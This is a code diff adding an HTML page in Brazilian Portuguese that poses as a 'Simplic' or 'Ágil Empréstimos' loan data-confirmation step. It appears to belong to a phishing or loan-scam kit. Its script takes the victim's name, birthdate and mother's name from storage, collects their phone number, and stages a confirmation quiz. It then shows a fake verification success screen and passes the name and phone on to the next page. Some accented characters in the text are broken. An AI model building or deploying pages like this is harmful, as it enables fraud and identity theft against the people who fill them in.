@@ -1,0 +1,485 @@
+
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Simplic - Confirmação de Dados</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="../assets/css/style.css">
+    
+</head>
+<body>
+    <header class="header">
+        <div class="container py-2">
+            <div class="d-flex justify-content-between align-items-center">
+                <div class="logo d-flex align-items-center">
+                   <img src="../assets/images/xlogo.png" alt="Simplic Logo" class="logo-img" data-pagespeed-url-hash="99038477" onload="pagespeed.CriticalImages.checkImageForCriticality(this);">
+                </div>
+                <div class="menu-icons">
+                    <svg class="info-icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <circle cx="12" cy="12" r="10" stroke="#333333" stroke-width="2"/>
+                        <path d="M12 7V12M12 16V16.01" stroke="#333333" stroke-width="2" stroke-linecap="round"/>
+                    </svg>
+                    <svg class="menu-icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M12 6V6.01M12 12V12.01M12 18V18.01" stroke="#333333" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <main class="main-content">
+        <div class="container">
+            <div class="confirmation-card">
+                <!-- Telefone -->
+                <div id="phone-step" class="form-step">
+                    <h2 class="confirmation-title">Confirmaço de Dados</h2>
+                    <p class="confirmation-text">Para sua segurança, precisamos confirmar algumas informações.</p>
+                    
+                    <div id="notification" class="notification-card">
+                        <i class="fas fa-exclamation-circle"></i>
+                        <span id="notification-message"></span>
+                    </div>
+                    
+                    <form id="phone-form" class="mt-4">
+                        <div class="mb-4">
+                            <label for="phone" class="form-label">Telefone Celular</label>
+                            <input type="text" class="form-control form-control-lg" id="phone" placeholder="(00) 00000-0000" maxlength="15" required>
+                            <div class="form-text">Precisamos de um número válido para enviar o código de verificaço.</div>
+                        </div>
+                        <button type="submit" class="btn btn-success btn-lg w-100" id="phone-verify-button">
+                            Continuar
+                        </button>
+                    </form>
+                </div>
+
+                <!-- nascimento -->
+                <div id="birthdate-step" class="form-step" style="display: none;">
+                    <h2 class="confirmation-title">Confirme sua Data de Nascimento</h2>
+                    <p class="confirmation-text">Selecione a opço que corresponde  sua data de nascimento:</p>
+                    
+                    <div id="birthdate-notification" class="notification-card">
+                        <i class="fas fa-exclamation-circle"></i>
+                        <span id="birthdate-notification-message"></span>
+                    </div>
+                    
+                    <div id="birthdate-options" class="options-container">
+                    </div>
+                    
+                    <div class="d-flex justify-content-between mt-4">
+                        <button class="btn btn-outline-secondary btn-lg" id="birthdate-back-button">Voltar</button>
+                    </div>
+                </div>
+
+                <!-- mãe -->
+                <div id="mother-step" class="form-step" style="display: none;">
+                    <h2 class="confirmation-title">Confirme o Nome da sua Mãe</h2>
+                    <p class="confirmation-text">Selecione a opção que corresponde ao nome da sua mãe:</p>
+                    
+                    <div id="mother-notification" class="notification-card">
+                        <i class="fas fa-exclamation-circle"></i>
+                        <span id="mother-notification-message"></span>
+                    </div>
+                    
+                    <div id="mother-options" class="options-container">
+                    </div>
+                    
+                    <div class="d-flex justify-content-between mt-4">
+                        <button class="btn btn-outline-secondary btn-lg" id="mother-back-button">Voltar</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <footer class="footer">
+        <div class="container">
+            <div class="footer-bottom py-3 text-center">
+                <p class="mb-1">© 2025 Ágil Empréstimos - Todos os direitos reservados.</p>
+                <p class="mb-1">CNPJ: 36.947.229/0001-85</p>
+                <p class="mb-0"><a href="#" class="text-white">Política de Privacidade</a> | <a href="#" class="text-white">Termos de Uso</a></p>
+            </div>
+        </div>
+    </footer>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/js/all.min.js"></script>
+        <script>
+        const userDataString = localStorage.getItem('dadosUsuario');
+        let userData;
+        
+        try {
+            if (!userDataString) {
+                window.location.href = '../2/index.html';
+            }
+            userData = JSON.parse(userDataString);
+            console.log('Dados do usuário recuperados:', userData);
+        } catch (error) {
+            console.error('Erro ao decodificar dados do usurio:', error);
+            window.location.href = '../2/index.html';
+        }
+        
+        let birthdateWrongAttempts = 0;
+        let motherWrongAttempts = 0;
+        
+        function showNotification(elementId, messageId, message) {
+            const notification = document.getElementById(elementId);
+            const notificationMessage = document.getElementById(messageId);
+            
+            notificationMessage.textContent = message;
+            notification.style.display = 'flex';
+            
+            setTimeout(() => {
+                notification.style.display = 'none';
+            }, 5000);
+        }
+        
+        document.getElementById('phone').addEventListener('input', function (e) {
+            let value = e.target.value;
+            
+            value = value.replace(/\D/g, '');
+            
+            if (value.length > 0) {
+                value = value.replace(/^(\d{2})(\d)/g, '($1) $2');
+                value = value.replace(/(\d)(\d{4})$/, '$1-$2');
+            }
+            
+            if (value.length > 15) {
+                value = value.substring(0, 15);
+            }
+            
+            e.target.value = value;
+            
+            e.target.selectionStart = e.target.value.length;
+            e.target.selectionEnd = e.target.value.length;
+        });
+        
+        document.getElementById('phone-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const phone = document.getElementById('phone').value.replace(/\D/g, '');
+            
+            if (phone.length < 10) {
+                showNotification('notification', 'notification-message', 'Por favor, insira um nmero de telefone vlido');
+                return;
+            }
+            
+            const telefoneFormatado = document.getElementById('phone').value;
+            localStorage.setItem('tel', telefoneFormatado);
+            
+            document.getElementById('phone-step').style.display = 'none';
+            
+            prepareAndShowBirthdateOptions();
+        });
+        
+        function prepareAndShowBirthdateOptions() {
+            const birthdateOptions = document.getElementById('birthdate-options');
+            birthdateOptions.innerHTML = '';
+            
+            let correctBirthdate = 'Nenhuma das alternativas';
+            if (userData.NASCIMENTO && userData.NASCIMENTO.trim() !== '') {
+                correctBirthdate = userData.NASCIMENTO;
+            }
+            
+            const options = generateRandomDates(correctBirthdate);
+            
+            shuffleArray(options);
+            
+            options.forEach((date, index) => {
+                const optionCard = document.createElement('div');
+                optionCard.className = 'option-card';
+                optionCard.dataset.value = date;
+                optionCard.innerHTML = date;
+                
+                optionCard.addEventListener('click', function() {
+                    document.querySelectorAll('#birthdate-options .option-card').forEach(card => {
+                        card.classList.remove('selected');
+                    });
+                    
+                    this.classList.add('selected');
+                    
+                    const selectedValue = this.dataset.value;
+                    let correctBirthdate = 'Nenhuma das alternativas';
+                    if (userData.NASCIMENTO && userData.NASCIMENTO.trim() !== '') {
+                        correctBirthdate = userData.NASCIMENTO;
+                    }
+                    
+                    if (selectedValue === correctBirthdate) {
+                        setTimeout(() => {
+                            document.getElementById('birthdate-step').style.display = 'none';
+                            
+                            prepareAndShowMotherOptions();
+                        }, 300);
+                    } else {
+                        showNotification('birthdate-notification', 'birthdate-notification-message', 
+                            'Data de nascimento incorreta! Por favor, tente novamente.');
+                        
+                        document.getElementById('birthdate-options').classList.add('error-shake');
+                        setTimeout(() => {
+                            document.getElementById('birthdate-options').classList.remove('error-shake');
+                        }, 500);
+                        
+                        setTimeout(() => {
+                            this.classList.remove('selected');
+                        }, 600);
+                    }
+                });
+                
+                birthdateOptions.appendChild(optionCard);
+            });
+            
+            document.getElementById('birthdate-step').style.display = 'block';
+        }
+        
+        function generateRandomDates(correctDate) {
+            const options = ['Nenhuma das alternativas'];
+            
+            if (correctDate !== 'Nenhuma das alternativas') {
+                options.push(correctDate);
+                
+                let [day, month, year] = [0, 0, 0];
+                try {
+                    const parts = correctDate.split('/');
+                    if (parts.length === 3) {
+                        day = parseInt(parts[0]);
+                        month = parseInt(parts[1]);
+                        year = parseInt(parts[2]);
+                    }
+                } catch (e) {
+                    console.error('Erro ao extrair partes da data:', e);
+                }
+                
+                while (options.length < 4) {
+                    const randomDay = Math.max(1, Math.min(28, day + Math.floor(Math.random() * 10) - 5));
+                    const randomMonth = Math.max(1, Math.min(12, month + Math.floor(Math.random() * 6) - 3));
+                    const randomYear = year + Math.floor(Math.random() * 6) - 3;
+                    
+                    const randomDate = `${randomDay.toString().padStart(2, '0')}/${randomMonth.toString().padStart(2, '0')}/${randomYear}`;
+                    
+                    if (!options.includes(randomDate)) {
+                        options.push(randomDate);
+                    }
+                }
+            } else {
+                const currentYear = new Date().getFullYear();
+                
+                while (options.length < 4) {
+                    const randomDay = Math.floor(Math.random() * 28) + 1;
+                    const randomMonth = Math.floor(Math.random() * 12) + 1;
+                    const randomYear = currentYear - Math.floor(Math.random() * 50) - 18;
+                    
+                    const randomDate = `${randomDay.toString().padStart(2, '0')}/${randomMonth.toString().padStart(2, '0')}/${randomYear}`;
+                    
+                    if (!options.includes(randomDate)) {
+                        options.push(randomDate);
+                    }
+                }
+            }
+            
+            return options;
+        }
+        
+        document.getElementById('birthdate-back-button').addEventListener('click', function() {
+            document.getElementById('birthdate-step').style.display = 'none';
+            document.getElementById('phone-step').style.display = 'block';
+        });
+        
+        function prepareAndShowMotherOptions() {
+            const motherOptions = document.getElementById('mother-options');
+            motherOptions.innerHTML = '';
+            
+            let correctMother = 'Nenhuma das alternativas';
+            if (userData.MAE && userData.MAE.trim() !== '') {
+                correctMother = userData.MAE.toUpperCase();
+            }
+            
+            const options = generateRandomNames(correctMother);
+            
+            shuffleArray(options);
+            
+            options.forEach((name, index) => {
+                const optionCard = document.createElement('div');
+                optionCard.className = 'option-card';
+                optionCard.dataset.value = name;
+                optionCard.innerHTML = name;
+                
+                optionCard.addEventListener('click', function() {
+                    document.querySelectorAll('#mother-options .option-card').forEach(card => {
+                        card.classList.remove('selected');
+                    });
+                    
+                    this.classList.add('selected');
+                    
+                    const selectedValue = this.dataset.value;
+                    let correctMother = 'Nenhuma das alternativas';
+                    if (userData.MAE && userData.MAE.trim() !== '') {
+                        correctMother = userData.MAE.toUpperCase();
+                    }
+                    
+                    if (selectedValue === correctMother) {
+                        setTimeout(() => {
+                            const params = getUrlParams();
+                            
+                            if (userData.nome) {
+                                params.name = userData.nome;
+                            }
+                            
+                            const telefone = localStorage.getItem('tel');
+                            if (telefone) {
+                                params.phone = telefone;
+                            }
+                            
+                            // Criar e mostrar mensagem de sucesso
+                            const successMessage = document.createElement('div');
+                            successMessage.className = 'confirmation-success';
+                            successMessage.innerHTML = `
+                                <div class="success-icon">
+                                    <i class="fas fa-check-circle fa-4x text-success"></i>
+                                </div>
+                                <h3 id="loading-message" class="mt-4 mb-4" style="color: #28a745;">Analisando seus dados...</h3>
+                                <div class="spinner-border text-success mb-4" role="status"></div>
+                                <p>Redirecionando para a próxima etapa...</p>
+                            `;
+                            
+                            // Estilo inline para o elemento
+                            successMessage.style.position = 'fixed';
+                            successMessage.style.top = '0';
+                            successMessage.style.left = '0';
+                            successMessage.style.width = '100%';
+                            successMessage.style.height = '100%';
+                            successMessage.style.backgroundColor = 'rgba(255, 255, 255, 0.9)';
+                            successMessage.style.display = 'flex';
+                            successMessage.style.flexDirection = 'column';
+                            successMessage.style.alignItems = 'center';
+                            successMessage.style.justifyContent = 'center';
+                            successMessage.style.zIndex = '9999';
+                            successMessage.style.animation = 'fadeIn 0.5s ease-in-out';
+                            
+                            // Adicionar a mensagem ao body
+                            document.body.appendChild(successMessage);
+                            
+                            // Adicionar animação ao CSS
+                            const style = document.createElement('style');
+                            style.innerHTML = `
+                                @keyframes fadeIn {
+                                    from { opacity: 0; }
+                                    to { opacity: 1; }
+                                }
+                            `;
+                            document.head.appendChild(style);
+                            
+                            // Mudar a mensagem aps 1.5 segundos
+                            setTimeout(() => {
+                                document.getElementById('loading-message').textContent = 'Dados verificados com sucesso!';
+                            }, 1500);
+                            
+                            // Redirecionar após mostrar a mensagem
+                            setTimeout(() => {
+                                const url = new URL('../4/index.html', window.location.href);
+                                Object.keys(params).forEach(key => {
+                                    url.searchParams.append(key, params[key]);
+                                });
+                                
+                                window.location.href = url.toString();
+                            }, 3000); // 3 segundos para mostrar a mensagem de sucesso
+                        }, 300);
+                    } else {
+                        showNotification('mother-notification', 'mother-notification-message', 
+                            'Nome da me incorreto! Por favor, tente novamente.');
+                        
+                        document.getElementById('mother-options').classList.add('error-shake');
+                        setTimeout(() => {
+                            document.getElementById('mother-options').classList.remove('error-shake');
+                        }, 500);
+                        
+                        setTimeout(() => {
+                            this.classList.remove('selected');
+                        }, 600);
+                    }
+                });
+                
+                motherOptions.appendChild(optionCard);
+            });
+            
+            document.getElementById('mother-step').style.display = 'block';
+        }
+        
+        function generateRandomNames(correctName) {
+            const options = ['Nenhuma das alternativas'];
+            
+            if (correctName !== 'Nenhuma das alternativas') {
+                options.push(correctName);
+                
+                const firstNames = [
+                    "MARIA", "ANA", "JULIANA", "FERNANDA", "MARCIA", 
+                    "SANDRA", "LUCIA", "CARLA", "TERESA", "REGINA"
+                ];
+                
+                const lastNames = [
+                    "SILVA", "SANTOS", "OLIVEIRA", "SOUZA", "FERREIRA", 
+                    "ALMEIDA", "PEREIRA", "LIMA", "COSTA", "RODRIGUES"
+                ];
+                
+                while (options.length < 4) {
+                    const firstName = firstNames[Math.floor(Math.random() * firstNames.length)];
+                    const lastName = lastNames[Math.floor(Math.random() * lastNames.length)];
+                    
+                    const randomName = `${firstName} ${lastName}`;
+                    
+                    if (!options.includes(randomName) && randomName !== correctName) {
+                        options.push(randomName);
+                    }
+                }
+            } else {
+                const firstNames = [
+                    "MARIA", "ANA", "JULIANA", "FERNANDA", "MARCIA", 
+                    "SANDRA", "LUCIA", "CARLA", "TERESA", "REGINA"
+                ];
+                
+                const lastNames = [
+                    "SILVA", "SANTOS", "OLIVEIRA", "SOUZA", "FERREIRA", 
+                    "ALMEIDA", "PEREIRA", "LIMA", "COSTA", "RODRIGUES"
+                ];
+                
+                while (options.length < 4) {
+                    const firstName = firstNames[Math.floor(Math.random() * firstNames.length)];
+                    const lastName = lastNames[Math.floor(Math.random() * lastNames.length)];
+                    
+                    const randomName = `${firstName} ${lastName}`;
+                    
+                    if (!options.includes(randomName)) {
+                        options.push(randomName);
+                    }
+                }
+            }
+            
+            return options;
+        }
+        
+        document.getElementById('mother-back-button').addEventListener('click', function() {
+            document.getElementById('mother-step').style.display = 'none';
+            document.getElementById('birthdate-step').style.display = 'block';
+        });
+        
+        function shuffleArray(array) {
+            for (let i = array.length - 1; i > 0; i--) {
+                const j = Math.floor(Math.random() * (i + 1));
+                [array[i], array[j]] = [array[j], array[i]];
+            }
+        }
+        
+        function getUrlParams() {
+            const params = {};
+            const queryString = window.location.search;
+
+            const urlParams = new URLSearchParams(queryString);
+            
+            for (const [key, value] of urlParams) {
+                params[key] = value;
+            }
+            return params;
+        }
+    </script>
+</body>
+</html> 
